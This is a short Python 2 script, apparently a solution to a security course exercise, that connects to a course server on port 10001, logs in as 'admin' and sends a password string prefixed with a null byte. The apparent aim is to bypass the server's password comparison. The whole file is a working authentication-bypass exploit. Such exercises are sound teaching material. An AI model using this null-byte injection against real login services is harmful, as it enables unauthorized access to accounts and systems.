#!/usr/bin/python
import socket

SIZE = 1024

# connect
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('secprog.cs.nctu.edu.tw', 10001))
print c.recv(SIZE)

# send/recv

c.send('login\n')
print c.recv(SIZE)

c.send('admin\n');
print c.recv(SIZE)

c.send('\x00DoYouThinkThisIsPassword\n');
print c.recv(SIZE)
print c.recv(SIZE)
print c.recv(SIZE)

# close
c.close()

